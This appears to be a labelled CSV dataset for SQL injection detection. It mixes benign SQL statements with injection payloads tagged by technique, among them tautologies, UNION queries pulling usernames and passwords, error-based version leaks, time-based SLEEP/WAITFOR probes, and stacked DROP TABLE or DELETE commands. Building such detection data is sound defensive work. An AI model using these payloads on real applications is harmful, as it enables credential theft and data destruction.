query_text,label,category
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE amount > 631 AND amount < 3331,0,benign
"SELECT id FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
admin'#,1,comment_bypass
INSERT INTO test_customers (name) VALUES ('jane'),0,benign
SELECT * FROM orders WHERE id = 373 OR '1'='1',1,tautology
SELECT * FROM test_customers WHERE id = 234 OR '1'='1',1,tautology
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
' UNION SELECT @@version--,1,union_based
1; DELETE FROM test_orders;--,1,stacked_queries
"SELECT id FROM test_customers WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM orders WHERE id = 481 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM customers WHERE id = 784,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT id FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT * FROM customers WHERE id = 690,0,benign
SELECT item FROM test_transactions WHERE item = 'smith',0,benign
SELECT * FROM customers WHERE amount > 723 AND amount < 4741,0,benign
"SELECT * FROM test_transactions WHERE id = 801 UNION SELECT username, password FROM users--",1,union_based
"SELECT * FROM test_transactions WHERE id = 856 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT item FROM customers WHERE item = 'jane',0,benign
DELETE FROM test_orders WHERE id = 274,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
INSERT INTO test_orders (item) VALUES ('corp'),0,benign
INSERT INTO test_orders (amount) VALUES ('acme'),0,benign
SELECT * FROM sessions WHERE id = 594,0,benign
SELECT COUNT(*) FROM sessions WHERE email IS NOT NULL,0,benign
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
INSERT INTO test_transactions (id) VALUES ('john'),0,benign
' OR 1=1#,1,tautology
' UNION SELECT @@version--,1,union_based
admin'--,1,comment_bypass
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM sessions WHERE name LIKE '%john%',0,benign
admin'--,1,comment_bypass
INSERT INTO sessions (item) VALUES ('acme'),0,benign
acme; DROP TABLE customers;--,1,stacked_queries
SELECT * FROM sessions WHERE amount > 936 AND amount < 4862,0,benign
INSERT INTO customers (id) VALUES ('acme'),0,benign
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
ltd; DROP TABLE customers;--,1,stacked_queries
SELECT * FROM orders WHERE name LIKE '%jane%',0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM customers WHERE id = 545 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM customers ORDER BY name DESC LIMIT 10,0,benign
SELECT * FROM test_customers WHERE id = 288 OR '1'='1',1,tautology
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM test_transactions ORDER BY name DESC LIMIT 10,0,benign
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE id = 128 OR '1'='1',1,tautology
SELECT * FROM test_orders WHERE id = 11 AND SLEEP(5),1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
UPDATE sessions SET status = 'test' WHERE id = 410,0,benign
SELECT * FROM test_transactions WHERE id = 309,0,benign
UPDATE customers SET email = 'gadget' WHERE id = 642,0,benign
UPDATE test_customers SET status = 'test' WHERE id = 730,0,benign
'; INSERT INTO test_customers VALUES ('hacked');--,1,stacked_queries
UPDATE test_orders SET item = 'widget' WHERE id = 10,0,benign
admin' OR '1'='1'--,1,tautology
SELECT * FROM orders ORDER BY id DESC LIMIT 10,0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
' OR ''=',1,comment_bypass
INSERT INTO test_orders (item) VALUES ('gadget'),0,benign
SELECT * FROM test_customers WHERE id = 751 OR 'a'='a',1,tautology
admin'--,1,comment_bypass
' UNION SELECT @@version--,1,union_based
' OR ''=',1,comment_bypass
SELECT COUNT(*) FROM customers WHERE id IS NOT NULL,0,benign
UPDATE test_orders SET item = 'corp' WHERE id = 105,0,benign
SELECT id FROM test_orders WHERE id = 'john',0,benign
DELETE FROM customers WHERE id = 250,0,benign
SELECT * FROM orders WHERE name LIKE '%corp%',0,benign
UPDATE test_orders SET amount = 'ltd' WHERE id = 696,0,benign
"SELECT * FROM test_orders WHERE id = 492 UNION SELECT username, password FROM users--",1,union_based
UPDATE orders SET item = 'gadget' WHERE id = 733,0,benign
UPDATE test_customers SET status = 'smith' WHERE id = 180,0,benign
admin'--,1,comment_bypass
DELETE FROM orders WHERE id = 800,0,benign
1; DELETE FROM test_customers;--,1,stacked_queries
SELECT * FROM test_transactions WHERE name LIKE '%jane%',0,benign
"SELECT amount FROM test_orders WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE id = 535 AND SLEEP(5),1,blind_time_based
test; DROP TABLE test_transactions;--,1,stacked_queries
1; DELETE FROM orders;--,1,stacked_queries
1; DELETE FROM test_orders;--,1,stacked_queries
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM sessions WHERE name LIKE '%corp%',0,benign
SELECT status FROM customers WHERE status = 'smith',0,benign
SELECT * FROM test_transactions WHERE name LIKE '%jane%',0,benign
DELETE FROM test_transactions WHERE id = 953,0,benign
SELECT * FROM test_orders WHERE name = '' OR 1=1--,1,tautology
' UNION SELECT @@version--,1,union_based
DELETE FROM customers WHERE id = 827,0,benign
SELECT * FROM test_customers WHERE id = 970 AND SLEEP(5),1,blind_time_based
' OR 1=1#,1,tautology
SELECT COUNT(*) FROM test_orders WHERE email IS NOT NULL,0,benign
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
UPDATE test_customers SET amount = 'smith' WHERE id = 282,0,benign
SELECT * FROM test_customers WHERE id = 671 AND SLEEP(5),1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
ltd; DROP TABLE test_transactions;--,1,stacked_queries
"SELECT * FROM orders WHERE id = 96 UNION SELECT username, password FROM users--",1,union_based
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM test_orders ORDER BY status DESC LIMIT 10,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
DELETE FROM customers WHERE id = 238,0,benign
SELECT item FROM customers WHERE item = 'jane',0,benign
SELECT COUNT(*) FROM test_customers WHERE item IS NOT NULL,0,benign
admin'#,1,comment_bypass
admin' OR '1'='1'--,1,tautology
admin'--,1,comment_bypass
"SELECT email FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
SELECT * FROM orders WHERE name = 'admin'--' AND password = 'test',1,comment_bypass
DELETE FROM customers WHERE id = 825,0,benign
SELECT * FROM sessions WHERE amount > 44 AND amount < 2178,0,benign
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM test_orders WHERE id = 622 UNION SELECT username, password FROM users--",1,union_based
SELECT * FROM test_orders WHERE name = 'admin'--' AND password = 'corp',1,comment_bypass
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM customers WHERE name LIKE '%gadget%',0,benign
SELECT * FROM sessions ORDER BY status DESC LIMIT 10,0,benign
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_transactions ORDER BY name DESC LIMIT 10,0,benign
"SELECT * FROM orders WHERE id = 254 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
admin' OR '1'='1'--,1,tautology
"SELECT * FROM test_orders WHERE id = 515 UNION SELECT username, password FROM users--",1,union_based
SELECT * FROM test_transactions WHERE name LIKE '%gadget%',0,benign
SELECT email FROM test_orders WHERE email = 'smith',0,benign
"' UNION SELECT NULL, NULL, NULL--",1,union_based
"SELECT * FROM test_transactions WHERE id = 423 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
DELETE FROM orders WHERE id = 17,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM customers WHERE id = 653,0,benign
INSERT INTO sessions (item) VALUES ('gadget'),0,benign
admin'#,1,comment_bypass
admin'--,1,comment_bypass
"SELECT * FROM test_transactions WHERE id = 179 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
"SELECT * FROM test_transactions WHERE id = 537 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM orders WHERE name LIKE '%gadget%',0,benign
jane; DROP TABLE customers;--,1,stacked_queries
SELECT * FROM sessions WHERE name = 'admin'--' AND password = 'ltd',1,comment_bypass
admin'--,1,comment_bypass
INSERT INTO customers (email) VALUES ('smith'),0,benign
DELETE FROM test_customers WHERE id = 327,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
"SELECT * FROM test_orders WHERE id = 800 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM sessions WHERE id = 683,0,benign
SELECT * FROM sessions WHERE name = '' OR 1=1--,1,tautology
' OR ''=',1,comment_bypass
1; DELETE FROM test_transactions;--,1,stacked_queries
INSERT INTO customers (item) VALUES ('jane'),0,benign
SELECT * FROM test_customers WHERE name LIKE '%corp%',0,benign
DELETE FROM customers WHERE id = 64,0,benign
corp; DROP TABLE orders;--,1,stacked_queries
DELETE FROM orders WHERE id = 797,0,benign
UPDATE test_transactions SET amount = 'widget' WHERE id = 704,0,benign
SELECT * FROM test_transactions WHERE amount > 348 AND amount < 4988,0,benign
"SELECT * FROM test_transactions WHERE id = 396 UNION SELECT username, password FROM users--",1,union_based
SELECT id FROM orders WHERE id = 'john',0,benign
' OR 1=1#,1,tautology
UPDATE customers SET name = 'jane' WHERE id = 539,0,benign
INSERT INTO test_transactions (email) VALUES ('test'),0,benign
SELECT * FROM test_transactions ORDER BY item DESC LIMIT 10,0,benign
' OR 1=1#,1,tautology
SELECT * FROM test_orders WHERE id = 489 AND SLEEP(5),1,blind_time_based
UPDATE test_customers SET item = 'jane' WHERE id = 335,0,benign
SELECT * FROM test_customers WHERE name LIKE '%jane%',0,benign
SELECT * FROM test_transactions WHERE name = 'admin'--' AND password = 'gadget',1,comment_bypass
UPDATE test_transactions SET email = 'ltd' WHERE id = 592,0,benign
SELECT * FROM sessions WHERE id = 44 AND SLEEP(5),1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM test_orders WHERE amount > 58 AND amount < 3608,0,benign
SELECT email FROM test_orders WHERE email = 'jane',0,benign
SELECT * FROM test_customers WHERE amount > 221 AND amount < 3389,0,benign
SELECT * FROM customers WHERE id = 238 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM customers ORDER BY status DESC LIMIT 10,0,benign
SELECT status FROM test_customers WHERE status = 'gadget',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
DELETE FROM customers WHERE id = 845,0,benign
SELECT * FROM sessions WHERE amount > 855 AND amount < 1335,0,benign
UPDATE sessions SET item = 'corp' WHERE id = 570,0,benign
SELECT COUNT(*) FROM orders WHERE item IS NOT NULL,0,benign
"SELECT * FROM customers WHERE id = 762 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_customers WHERE amount > 794 AND amount < 2066,0,benign
INSERT INTO sessions (amount) VALUES ('corp'),0,benign
admin' OR '1'='1'--,1,tautology
"SELECT * FROM test_transactions WHERE id = 51 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
UPDATE orders SET id = 'smith' WHERE id = 249,0,benign
smith; DROP TABLE test_customers;--,1,stacked_queries
SELECT * FROM customers WHERE id = 860,0,benign
DELETE FROM test_transactions WHERE id = 978,0,benign
admin' OR '1'='1'--,1,tautology
SELECT * FROM test_customers ORDER BY amount DESC LIMIT 10,0,benign
SELECT name FROM test_orders WHERE name = 'john',0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
admin'--,1,comment_bypass
SELECT * FROM test_customers ORDER BY amount DESC LIMIT 10,0,benign
SELECT * FROM test_transactions WHERE status = 'active' OR status = 'pending',0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
"SELECT id FROM test_orders WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT * FROM test_orders ORDER BY status DESC LIMIT 10,0,benign
SELECT COUNT(*) FROM sessions WHERE amount IS NOT NULL,0,benign
SELECT * FROM test_orders WHERE name LIKE '%jane%',0,benign
SELECT * FROM test_customers WHERE id = 853,0,benign
SELECT item FROM test_transactions WHERE item = 'test',0,benign
SELECT status FROM orders WHERE status = 'smith',0,benign
SELECT * FROM orders ORDER BY item DESC LIMIT 10,0,benign
1; DELETE FROM customers;--,1,stacked_queries
DELETE FROM test_customers WHERE id = 872,0,benign
SELECT amount FROM customers WHERE amount = 'widget',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT id FROM test_orders WHERE id = 'corp',0,benign
INSERT INTO sessions (status) VALUES ('gadget'),0,benign
SELECT status FROM customers WHERE status = 'john',0,benign
INSERT INTO orders (email) VALUES ('test'),0,benign
SELECT * FROM sessions ORDER BY id DESC LIMIT 10,0,benign
INSERT INTO test_orders (amount) VALUES ('widget'),0,benign
' OR '1'='1,1,tautology
' UNION SELECT @@version--,1,union_based
admin' OR '1'='1'--,1,tautology
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
' UNION SELECT @@version--,1,union_based
SELECT * FROM orders WHERE amount > 422 AND amount < 3318,0,benign
admin' OR '1'='1'--,1,tautology
SELECT COUNT(*) FROM test_transactions WHERE item IS NOT NULL,0,benign
DELETE FROM customers WHERE id = 195,0,benign
"SELECT * FROM test_orders WHERE id = 239 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT COUNT(*) FROM sessions WHERE status IS NOT NULL,0,benign
SELECT amount FROM test_transactions WHERE amount = 'acme',0,benign
INSERT INTO test_orders (item) VALUES ('acme'),0,benign
' OR 1=1#,1,tautology
' UNION SELECT @@version--,1,union_based
INSERT INTO customers (amount) VALUES ('widget'),0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
"' UNION SELECT NULL, NULL, NULL--",1,union_based
SELECT * FROM test_customers WHERE amount > 372 AND amount < 2265,0,benign
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
SELECT * FROM sessions WHERE id = 392 OR 'a'='a',1,tautology
SELECT * FROM test_orders WHERE name = '' OR 1=1--,1,tautology
SELECT * FROM test_transactions WHERE status = 'active' OR status = 'pending',0,benign
DELETE FROM orders WHERE id = 501,0,benign
SELECT * FROM test_customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM sessions WHERE id = 247,0,benign
SELECT * FROM test_transactions WHERE amount > 65 AND amount < 1454,0,benign
' OR '1'='1,1,tautology
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM test_orders ORDER BY item DESC LIMIT 10,0,benign
SELECT * FROM sessions WHERE amount > 706 AND amount < 1245,0,benign
' OR '1'='1,1,tautology
SELECT * FROM customers WHERE id = 622 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM test_orders ORDER BY id DESC LIMIT 10,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM customers WHERE id = 970 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT COUNT(*) FROM test_orders WHERE name IS NOT NULL,0,benign
SELECT * FROM orders WHERE amount > 675 AND amount < 2765,0,benign
SELECT * FROM test_transactions WHERE name LIKE '%corp%',0,benign
SELECT * FROM sessions ORDER BY email DESC LIMIT 10,0,benign
SELECT * FROM orders WHERE name = 'admin'--' AND password = 'john',1,comment_bypass
"' UNION SELECT NULL, NULL, NULL--",1,union_based
SELECT * FROM customers WHERE status = 'active' OR status = 'pending',0,benign
john; DROP TABLE sessions;--,1,stacked_queries
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_orders WHERE id = 416 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT COUNT(*) FROM sessions WHERE id IS NOT NULL,0,benign
admin'#,1,comment_bypass
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM test_orders WHERE name = 'admin'--' AND password = 'acme',1,comment_bypass
'; INSERT INTO test_customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_transactions WHERE status = 'active' OR status = 'pending',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM sessions WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM test_orders WHERE id = 215 OR '1'='1',1,tautology
"SELECT * FROM test_transactions WHERE id = 534 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM orders WHERE id = 985,0,benign
'; INSERT INTO test_customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM orders WHERE id = 240,0,benign
' UNION SELECT @@version--,1,union_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT COUNT(*) FROM orders WHERE name IS NOT NULL,0,benign
UPDATE test_transactions SET name = 'acme' WHERE id = 755,0,benign
SELECT item FROM orders WHERE item = 'smith',0,benign
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
' OR '1'='1,1,tautology
DELETE FROM sessions WHERE id = 588,0,benign
UPDATE customers SET name = 'corp' WHERE id = 461,0,benign
SELECT COUNT(*) FROM orders WHERE amount IS NOT NULL,0,benign
' OR ''=',1,comment_bypass
SELECT * FROM test_orders WHERE id = 251,0,benign
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
SELECT * FROM orders WHERE id = 945 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
"SELECT * FROM customers WHERE id = 407 UNION SELECT username, password FROM users--",1,union_based
"SELECT * FROM test_orders WHERE id = 125 UNION SELECT username, password FROM users--",1,union_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM orders WHERE amount > 537 AND amount < 1609,0,benign
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT * FROM orders ORDER BY id DESC LIMIT 10,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM sessions ORDER BY status DESC LIMIT 10,0,benign
"SELECT item FROM test_transactions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT name FROM test_orders WHERE name = 'gadget',0,benign
SELECT * FROM test_customers WHERE id = 571,0,benign
SELECT * FROM sessions WHERE name = 'admin'--' AND password = 'corp',1,comment_bypass
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
'; INSERT INTO sessions VALUES ('hacked');--,1,stacked_queries
admin'#,1,comment_bypass
SELECT * FROM orders WHERE name = '' OR 1=1--,1,tautology
SELECT * FROM orders WHERE name LIKE '%widget%',0,benign
SELECT * FROM test_transactions WHERE amount > 942 AND amount < 1522,0,benign
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT * FROM orders WHERE id = 592 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM orders WHERE id = 162 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT COUNT(*) FROM test_orders WHERE email IS NOT NULL,0,benign
INSERT INTO orders (email) VALUES ('corp'),0,benign
UPDATE orders SET id = 'smith' WHERE id = 324,0,benign
' OR ''=',1,comment_bypass
SELECT * FROM test_customers WHERE name = 'admin'--' AND password = 'widget',1,comment_bypass
admin' OR '1'='1'--,1,tautology
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
"' UNION SELECT NULL, NULL, NULL--",1,union_based
' OR '1'='1,1,tautology
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
'; INSERT INTO sessions VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_customers WHERE name LIKE '%widget%',0,benign
admin' OR '1'='1'--,1,tautology
SELECT * FROM test_transactions ORDER BY status DESC LIMIT 10,0,benign
SELECT COUNT(*) FROM test_customers WHERE amount IS NOT NULL,0,benign
INSERT INTO customers (item) VALUES ('john'),0,benign
INSERT INTO sessions (email) VALUES ('corp'),0,benign
' OR ''=',1,comment_bypass
UPDATE customers SET status = 'ltd' WHERE id = 223,0,benign
SELECT * FROM sessions WHERE id = 427,0,benign
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
SELECT COUNT(*) FROM test_orders WHERE item IS NOT NULL,0,benign
admin' OR '1'='1'--,1,tautology
' OR ''=',1,comment_bypass
SELECT * FROM customers WHERE name LIKE '%ltd%',0,benign
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
1; DELETE FROM sessions;--,1,stacked_queries
SELECT * FROM orders WHERE name LIKE '%jane%',0,benign
SELECT * FROM test_transactions ORDER BY name DESC LIMIT 10,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT COUNT(*) FROM customers WHERE amount IS NOT NULL,0,benign
' OR '1'='1,1,tautology
' OR 1=1#,1,tautology
INSERT INTO test_transactions (status) VALUES ('john'),0,benign
' OR ''=',1,comment_bypass
SELECT * FROM test_orders WHERE name LIKE '%acme%',0,benign
SELECT * FROM test_transactions ORDER BY item DESC LIMIT 10,0,benign
SELECT * FROM orders ORDER BY status DESC LIMIT 10,0,benign
'; INSERT INTO test_orders VALUES ('hacked');--,1,stacked_queries
INSERT INTO sessions (amount) VALUES ('smith'),0,benign
SELECT COUNT(*) FROM test_customers WHERE id IS NOT NULL,0,benign
SELECT COUNT(*) FROM orders WHERE email IS NOT NULL,0,benign
UPDATE test_orders SET item = 'ltd' WHERE id = 824,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
' OR 1=1#,1,tautology
DELETE FROM test_transactions WHERE id = 398,0,benign
' OR 1=1#,1,tautology
SELECT * FROM test_customers WHERE id = 677 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
"SELECT * FROM orders WHERE id = 331 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
"' UNION SELECT NULL, NULL, NULL--",1,union_based
' OR ''=',1,comment_bypass
"SELECT * FROM test_orders WHERE id = 257 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM orders WHERE status = 'active' OR status = 'pending',0,benign
1; DELETE FROM sessions;--,1,stacked_queries
admin' OR '1'='1'--,1,tautology
SELECT * FROM orders WHERE amount > 783 AND amount < 2651,0,benign
"SELECT * FROM customers WHERE id = 654 UNION SELECT username, password FROM users--",1,union_based
"SELECT * FROM test_transactions WHERE id = 931 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
INSERT INTO test_customers (item) VALUES ('gadget'),0,benign
admin'#,1,comment_bypass
SELECT status FROM test_customers WHERE status = 'ltd',0,benign
DELETE FROM sessions WHERE id = 383,0,benign
SELECT * FROM test_customers WHERE id = 562 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM customers WHERE name = '' OR 1=1--,1,tautology
INSERT INTO test_orders (item) VALUES ('gadget'),0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_customers WHERE name LIKE '%john%',0,benign
SELECT * FROM orders WHERE name LIKE '%john%',0,benign
